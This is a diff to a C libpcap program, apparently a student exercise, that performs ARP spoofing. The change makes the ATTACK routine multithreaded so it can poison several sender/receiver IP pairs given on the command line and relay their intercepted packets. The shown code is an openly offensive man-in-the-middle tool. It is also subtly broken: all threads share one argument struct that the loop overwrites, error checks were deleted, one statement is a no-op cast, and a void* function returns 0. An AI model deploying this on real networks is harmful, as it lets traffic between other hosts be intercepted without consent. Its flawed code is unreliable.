@@ -28,6 +28,15 @@ typedef struct{
 	
 }ether_ip_header;
 
+typedef struct 
+{
+	char * dev;
+   	char * sender_ip;
+	char * receiver_ip;
+}MultipleArg;
+
+
+
 
 void get_mac_address(u_int8_t *mac_address, u_int8_t *interface)
 {
@@ -52,8 +61,11 @@ void get_ip_address(u_int8_t *ip_address, u_int8_t *interface) {
 }
 
 
-void ATTACK(char *device, char *send_ip, char *recv_ip)
+void *ATTACK(void *multiple_arg)
 {
+	MultipleArg *my_multiple_arg = (MultipleArg *)multiple_arg;
+
+
 	pcap_t *handle;				/* Session handle */
 	u_int8_t *dev;				/* The device to sniff on */
 	u_int8_t errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
@@ -72,23 +84,17 @@ void ATTACK(char *device, char *send_ip, char *recv_ip)
 
 
 	/* Define the device */
-	dev = device;
-	if (dev == NULL) {
-		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
-		return(2);
-	}
+	dev = my_multiple_arg->dev;
+	
 	
 	
 	/* Open the session in promiscuous mode */
 	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-	if (handle == NULL) {
-		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
-		return(2);
-	}
+	
 
 	/*set sender's and receiver's ip address*/	
-	inet_pton(AF_INET, send_ip, sender_ip);
-	inet_pton(AF_INET, recv_ip, receiver_ip);
+	inet_pton(AF_INET, my_multiple_arg->sender_ip, sender_ip);
+	inet_pton(AF_INET, my_multiple_arg->receiver_ip, receiver_ip);
 
 	/*PART_1 : find attacker's ip and mac address*/
 	get_mac_address(attacker_mac, dev);
@@ -207,6 +213,8 @@ void ATTACK(char *device, char *send_ip, char *recv_ip)
 		(packet_get[11]==sender_mac[5])&&(packet_get[30]==receiver_ip[0])&&(packet_get[31]==receiver_ip[1])&&(packet_get[32]==receiver_ip[2])&&(packet_get[33]==receiver_ip[3]))
 		{
 			packet_relay = (ether_ip_header*)(packet_get);
+			//고친부분
+			(const u_char *)packet_relay;	
 			pcap_sendpacket(handle, packet_relay,60);
 		}
 		/*************______________________ARP REPLY FINISH_____________________________________*****************/
@@ -247,17 +255,44 @@ void ATTACK(char *device, char *send_ip, char *recv_ip)
 
 	/* And close the session */
 	pcap_close(handle);
-	return;
+	
+	return 0;
 
 }
 
 
-void main(){
-	
+int main(int argc, char *argv[])
+{
+	int thread_num = (argc-2)/2;
+	pthread_t p_thread[thread_num];
+	int thr_id;
+	int status;
+	int i;
+	int j;
 
+	MultipleArg *multiple_arg;
+	multiple_arg = (MultipleArg *)malloc(sizeof(MultipleArg));
+
+	for(i=0;i<thread_num;i++)
+	{
+		j = (i+1)*2;
+		multiple_arg->dev = argv[1];
+		multiple_arg->sender_ip = argv[j];
+		multiple_arg->receiver_ip = argv[j+1];
+
+		pthread_create(&p_thread[i], NULL, ATTACK, (void *) multiple_arg);		
+	}
 	
+	for(i=0;i<thread_num;i++)
+	{
+		pthread_join(p_thread[i], (void **)&status);
+	}
+
+	free(multiple_arg);
 	
-}
+	return 0;
+	
+}	
 
 
 
